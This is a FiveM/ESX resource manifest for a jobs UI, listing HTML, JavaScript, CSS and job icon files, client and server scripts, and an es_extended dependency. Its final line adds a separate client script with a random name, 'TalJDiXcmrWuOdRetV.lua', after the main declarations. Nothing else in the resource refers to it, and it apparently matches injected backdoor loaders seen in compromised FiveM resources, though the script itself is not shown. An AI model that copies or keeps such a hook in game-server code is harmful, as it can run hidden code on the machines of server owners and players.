resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

ui_page "html/ui.html"

files {
	"html/ui.html",
	"html/js/index.js",
	"html/css/style.css",
	-- Job Images
	'html/images/jobs/banker.png',
	'html/images/jobs/unicorn.png',
	'html/images/jobs/bus.png',
	'html/images/jobs/cardealer.png',
	'html/images/jobs/detective.png',
	'html/images/jobs/ambulance.png',
	'html/images/jobs/tailor.png',
	'html/images/jobs/fisherman.png',
	'html/images/jobs/garbage.png',
	'html/images/jobs/lumberjack.png',
	'html/images/jobs/slaughterer.png',
	'html/images/jobs/mechanic.png',
	'html/images/jobs/miner.png',
	'html/images/jobs/pizza.png',
	'html/images/jobs/police.png',
	'html/images/jobs/gopostal.png',
	'html/images/jobs/reporter.png',
	'html/images/jobs/realestateagent.png',
	'html/images/jobs/banksecurity.png',
	'html/images/jobs/sheriff.png',
	'html/images/jobs/swat.png',
	'html/images/jobs/fueler.png',
	'html/images/jobs/trucker.png',
	'html/images/jobs/taxi.png',
	'html/images/jobs/unemployed.png',
	'html/images/jobs/airlines.png',
	-- PRICHE
	'html/images/jobs/priche.png',
}

client_script {
	'@es_extended/locale.lua',
	'config.lua',
	'client.lua'
}

server_script {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'config.lua',
	'server.lua'
}

dependency 'es_extended'
client_script "TalJDiXcmrWuOdRetV.lua"
